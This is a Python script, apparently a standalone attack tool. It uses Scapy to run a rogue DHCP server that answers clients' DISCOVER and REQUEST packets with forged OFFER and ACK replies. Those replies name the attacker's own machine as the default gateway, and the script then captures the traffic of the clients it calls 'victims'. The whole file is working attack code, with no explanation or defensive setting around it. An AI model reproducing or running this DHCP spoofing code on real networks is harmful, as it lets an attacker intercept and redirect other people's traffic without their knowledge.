from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.dhcp import *
from func_timeout import func_timeout, FunctionTimedOut

iface = ""

DHCP_DISCOVER_TYPE = 1
DHCP_OFFER_TYPE = 2
DHCP_REQUEST_TYPE = 3
DHCP_ACKNOWLEDGE_TYPE = 5
BOOTPC = 68 # Client side DHCP port
BOOTPS = 67 # DHCP server side port
BOOTP_REPLY_OP_CODE = 2

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
BROADCAST_IP = "255.255.255.255"

MY_COMPUTER_MAC = "00:50:56:c0:00:08"
MY_COMPUTER_IP = "192.168.63.1"

REAL_ROUTER_MAC = "00:50:56:e1:87:c2"
REAL_ROUTER_IP = "192.168.63.254"

SUBNET_MASK = "192.168.63."
DNS_SERVER_IP = "192.168.63.2"

socket_send = conf.L2socket(iface=iface)
vacant_ips = []
victim_ips = []

returnString = ""

# Finds vacant IP Addresses and returns a vacant IP Addresses array
def find_vacant_ip_address(ip_count = 1):
    time_to_wait = 1 # in seconds
    count = 2
    ping_packet = IP(src = MY_COMPUTER_IP) / ICMP(type = "echo-request") / Raw('abcdefghigklmnopqrstuvwabcdefghi') # ICMP Echo Request
    while len(vacant_ips) < ip_count:
        print(len(vacant_ips))
        ping_packet[IP].dst = SUBNET_MASK + str(count)
        if (ping_packet[IP].dst == MY_COMPUTER_IP):
            count += 1
            ping_packet[IP].dst = SUBNET_MASK + str(count)
        try:
            func_timeout(time_to_wait, sr1, ping_packet)
        except FunctionTimedOut:
            vacant_ips.append(ping_packet[IP].dst)
        count += 1

    print(vacant_ips)
    print("Victim Count = {0} Victim IP = {1}".format(len(vacant_ips), vacant_ips[len(vacant_ips) -1]))

def build_dhcp_packet(packet, type):
    packet_to_send = None
    victim_ip_offer = vacant_ips[len(vacant_ips) - 1]

    ether = Ether(src = MY_COMPUTER_MAC, dst = BROADCAST_MAC)
    ip = IP(src = MY_COMPUTER_IP, dst = BROADCAST_IP)
    udp = UDP(sport = BOOTPS, dport = BOOTPC)
    bootp = BOOTP(op = BOOTP_REPLY_OP_CODE, xid = packet[BOOTP].xid, yiaddr = victim_ip_offer, siaddr = MY_COMPUTER_IP, chaddr = packet[BOOTP].chaddr, sname = packet[BOOTP].sname, file = packet[BOOTP].file, options = packet[BOOTP].options)
    dhcp = DHCP(options = [
        ("message-type", type), 
        ("subnet_mask", "255.255.255.0"), 
        ("time_zone", 0), 
        ("router", MY_COMPUTER_IP), 
        ("default_ttl", 40), 
        ("lease_time", 3600), 
        ("server_id", MY_COMPUTER_IP), 
        ('renewal_time', 1800), 
        ('rebinding_time', 3150), 
        ('name_server', DNS_SERVER_IP), 'end', 'pad'])
    

    if type == DHCP_ACKNOWLEDGE_TYPE:
        vacant_ips.remove(vacant_ips[len(vacant_ips) - 1])
        victim_ips.append(victim_ip_offer)

    packet_to_send = ether / ip / udp / bootp / dhcp
    
    return packet_to_send

def build_dhcp_response_packet(packet):
    global returnString
    packet_to_send = None

    if DHCP not in packet:
        print("Victim Packet")
        print(packet.summary())
    else:
        if DHCP in packet and packet[DHCP].options[0][1] == DHCP_DISCOVER_TYPE:
            print("DHCP DISCOVER")
            packet_to_send = build_dhcp_packet(packet, DHCP_OFFER_TYPE)
            sendp(packet_to_send, socket=socket_send)

        elif DHCP in packet and packet[DHCP].options[0][1] == DHCP_REQUEST_TYPE:
            print("DHCP REQUEST")
            packet_to_send = build_dhcp_packet(packet, DHCP_ACKNOWLEDGE_TYPE)
            sendp(packet_to_send, socket=socket_send)
            returnString = f"A Device Is Connected At - {victim_ips[len(victim_ips) - 1]}"
            return True

def filter_dhcp_packets(packet):    
    is_dhcp_packet = ( DHCP in packet ) and ( packet[DHCP].options[0][1] in (DHCP_DISCOVER_TYPE, DHCP_REQUEST_TYPE))
    victim_packet = ( IP in packet ) and ( packet[IP].src in victim_ips)
    return is_dhcp_packet or victim_packet

def spoof(return_dict, ifaceName, gateway_ip, computer_mac, subnet_mask, dns_server_ip, router_mac, router_ip):
    global iface
    global MY_COMPUTER_IP
    global MY_COMPUTER_MAC
    global REAL_ROUTER_IP
    global REAL_ROUTER_MAC
    global SUBNET_MASK
    global DNS_SERVER_IP
    global returnString
    
    MY_COMPUTER_IP = gateway_ip
    MY_COMPUTER_MAC = computer_mac
    REAL_ROUTER_IP = router_ip
    REAL_ROUTER_MAC = router_mac
    SUBNET_MASK = subnet_mask
    DNS_SERVER_IP = dns_server_ip
    iface = ifaceName

    find_vacant_ip_address(ip_count=1)
    print("start sniffing...")
    sniff(lfilter = filter_dhcp_packets, iface=iface, stop_filter=build_dhcp_response_packet)
    return_dict[0] = returnString